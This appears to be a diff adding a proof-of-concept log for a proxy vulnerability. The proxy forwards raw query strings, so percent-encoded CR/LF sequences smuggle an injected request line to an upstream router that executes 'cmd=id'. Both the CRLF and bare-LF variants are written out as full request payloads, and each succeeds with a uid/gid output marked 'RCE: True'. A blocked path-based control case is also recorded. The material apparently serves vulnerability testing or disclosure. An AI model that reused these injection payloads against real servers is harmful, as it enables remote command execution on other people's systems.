@@ -1,0 +1,29 @@
+build        : 1cfd33433d25__afdc173f
+upstream     : line-oriented lenient router - decodes %XX, splits head on LF, execs cmd=<sh>
+claim        : pathdecode() validates only the pre-'?' part (c<32/127); query = raw.substr(q), forwarded raw
+config       : kv file, proxy_prefix=/api/
+
+--- query CRLF
+client request: b'GET /api/x?a%0d%0aGET%20/exec%3fcmd=id%20HTTP/1.1%0d%0aHost:%20u%0d%0a HTTP/1.1\r\nHost: alpha.test\r\nConnection: close\r\n\r\n'
+upstream head: b'GET /x?a%0d%0aGET%20/exec%3fcmd=id%20HTTP/1.1%0d%0aHost:%20u%0d%0a HTTP/1.1\r\nHost: 127.0.0.1:55533\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n'
+upstream decisions: ['line0: 2 tokens', 'line1: EXEC /exec?cmd=id', 'line2: 2 tokens', 'line3: 2 tokens', 'line4: 2 tokens', 'line5: 2 tokens', 'line6: 2 tokens']
+client status: HTTP/1.1 200 OK
+body: uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),
+RCE: True
+
+--- query bare LF
+client request: b'GET /api/x?a%0aGET%20/exec%3fcmd=id%20HTTP/1.1%0aHost:%20u%0a HTTP/1.1\r\nHost: alpha.test\r\nConnection: close\r\n\r\n'
+upstream head: b'GET /x?a%0aGET%20/exec%3fcmd=id%20HTTP/1.1%0aHost:%20u%0a HTTP/1.1\r\nHost: 127.0.0.1:50353\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n'
+upstream decisions: ['line0: 2 tokens', 'line1: EXEC /exec?cmd=id', 'line2: 2 tokens', 'line3: 2 tokens', 'line4: 2 tokens', 'line5: 2 tokens', 'line6: 2 tokens']
+client status: HTTP/1.1 200 OK
+body: uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),
+RCE: True
+
+--- path CRLF (control)
+client request: b'GET /api/exec%0d%0a?cmd=id HTTP/1.1\r\nHost: alpha.test\r\nConnection: close\r\n\r\n'
+upstream head: <no connection>
+upstream decisions: -
+client status: HTTP/1.1 400 Bad Request
+body: 
+RCE: False
+
